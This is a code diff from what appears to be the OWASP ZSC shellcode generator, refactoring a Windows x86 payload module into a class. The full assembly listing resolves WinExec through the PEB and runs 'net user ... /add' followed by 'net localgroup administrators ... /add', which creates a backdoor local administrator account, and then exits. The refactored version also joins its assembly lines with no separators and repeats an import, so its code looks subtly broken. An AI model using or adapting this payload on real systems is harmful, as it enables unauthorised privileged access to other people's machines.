@@ -8,86 +8,92 @@ https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com 
 """
 from cores import stack
 from math import ceil
+from new_cores import base_module
+from cores import stack
 
 
-def add_admin(command_hex, command):
-    return '''
-xor    %ecx,%ecx
-mov    %fs:0x30(%ecx),%eax
-mov    0xc(%eax),%eax
-mov    0x14(%eax),%esi
-lods   %ds:(%esi),%eax
-xchg   %eax,%esi
-lods   %ds:(%esi),%eax
-mov    0x10(%eax),%ebx
-mov    0x3c(%ebx),%edx
-add    %ebx,%edx
-mov    0x78(%edx),%edx
-add    %ebx,%edx
-mov    0x20(%edx),%esi
-add    %ebx,%esi
-xor    %ecx,%ecx
-inc    %ecx
-lods   %ds:(%esi),%eax
-add    %ebx,%eax
-cmpl   $0x50746547,(%eax)
-jne    23 <.text+0x23>
-cmpl   $0x41636f72,0x4(%eax)
-jne    23 <.text+0x23>
-cmpl   $0x65726464,0x8(%eax)
-jne    23 <.text+0x23>
-mov    0x24(%edx),%esi
-add    %ebx,%esi
-mov    (%esi,%ecx,2),%cx
-dec    %ecx
-mov    0x1c(%edx),%esi
-add    %ebx,%esi
-mov    (%esi,%ecx,4),%edx
-add    %ebx,%edx
-push   %ebx
-push   %edx
-xor    %ecx,%ecx
-push   %ecx
-mov    $0x61636578,%ecx
-push   %ecx
-subl   $0x61,0x3(%esp)
-push   $0x456e6957
-push   %esp
-push   %ebx
-call   *%edx
-add    $0x8,%esp
-pop    %ecx
-push   %eax
-xor    %ecx,%ecx
-push   %ecx
-{0}
-xor    %ebx,%ebx
-mov    %esp,%ebx
-xor    %ecx,%ecx
-inc    %ecx
-push   %ecx
-push   %ebx
-call   *%eax
-add    ${1},%esp
-pop    %edx
-pop    %ebx
-xor    %ecx,%ecx
-mov    $0x61737365,%ecx
-push   %ecx
-subl   $0x61,0x3(%esp)
-push   $0x636f7250
-push   $0x74697845
-push   %esp
-push   %ebx
-call   *%edx
-xor    %ecx,%ecx
-push   %ecx
-call   *%eax
-'''.format(command_hex, hex(int(8 + 4 * (ceil(len(command) / float(4))))))
+class Module(base_module.BaseModule):
+    username = base_module.OptString("", "Username")
+    passsword = base_module.OptString("", "Password")
 
+    def generate(self, command, cvtcommand):
+        payload = "xor    %ecx,%ecx"
+        payload += "mov    %fs:0x30(%ecx),%eax"
+        payload += "mov    0xc(%eax),%eax"
+        payload += "mov    0x14(%eax),%esi"
+        payload += "lods   %ds:(%esi),%eax"
+        payload += "xchg   %eax,%esi"
+        payload += "lods   %ds:(%esi),%eax"
+        payload += "mov    0x10(%eax),%ebx"
+        payload += "mov    0x3c(%ebx),%edx"
+        payload += "add    %ebx,%edx"
+        payload += "mov    0x78(%edx),%edx"
+        payload += "add    %ebx,%edx"
+        payload += "mov    0x20(%edx),%esi"
+        payload += "add    %ebx,%esi"
+        payload += "xor    %ecx,%ecx"
+        payload += "inc    %ecx"
+        payload += "lods   %ds:(%esi),%eax"
+        payload += "add    %ebx,%eax"
+        payload += "cmpl   $0x50746547,(%eax)"
+        payload += "jne    23 <.text+0x23>"
+        payload += "cmpl   $0x41636f72,0x4(%eax)"
+        payload += "jne    23 <.text+0x23>"
+        payload += "cmpl   $0x65726464,0x8(%eax)"
+        payload += "jne    23 <.text+0x23>"
+        payload += "mov    0x24(%edx),%esi"
+        payload += "add    %ebx,%esi"
+        payload += "mov    (%esi,%ecx,2),%cx"
+        payload += "dec    %ecx"
+        payload += "mov    0x1c(%edx),%esi"
+        payload += "add    %ebx,%esi"
+        payload += "mov    (%esi,%ecx,4),%edx"
+        payload += "add    %ebx,%edx"
+        payload += "push   %ebx"
+        payload += "push   %edx"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += "mov    $0x61636578,%ecx"
+        payload += "push   %ecx"
+        payload += "subl   $0x61,0x3(%esp)"
+        payload += "push   $0x456e6957"
+        payload += "push   %esp"
+        payload += "push   %ebx"
+        payload += "call   *%edx"
+        payload += "add    $0x8,%esp"
+        payload += "pop    %ecx"
+        payload += "push   %eax"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += command
+        payload += "xor    %ebx,%ebx"
+        payload += "mov    %esp,%ebx"
+        payload += "xor    %ecx,%ecx"
+        payload += "inc    %ecx"
+        payload += "push   %ecx"
+        payload += "push   %ebx"
+        payload += "call   *%eax"
+        payload += f"add    ${cvtcommand},%esp"
+        payload += "pop    %edx"
+        payload += "pop    %ebx"
+        payload += "xor    %ecx,%ecx"
+        payload += "mov    $0x61737365,%ecx"
+        payload += "push   %ecx"
+        payload += "subl   $0x61,0x3(%esp)"
+        payload += "push   $0x636f7250"
+        payload += "push   $0x74697845"
+        payload += "push   %esp"
+        payload += "push   %ebx"
+        payload += "call   *%edx"
+        payload += "xor    %ecx,%ecx"
+        payload += "push   %ecx"
+        payload += "call   *%eax"
+        return payload
 
-def run(data):
-    username = data[0]
-    passsword = data[1]
-    command = "cmd.exe /c net user " + username + " " + passsword + " /add && net localgroup administrators " + username + " /add"
-    return add_admin(stack.generate(command, "%ecx", "string"), command)
+    def run(self):
+        command = f"cmd.exe /c net user {self.username} {self.passsword} /add && " \
+                  f"net localgroup administrators {self.username} /add "
+        print(self.generate(
+            stack.generate(command, "%ecx", "string"),
+            hex(int(8 + 4 * (ceil(len(command) / float(4)))))
+        ))
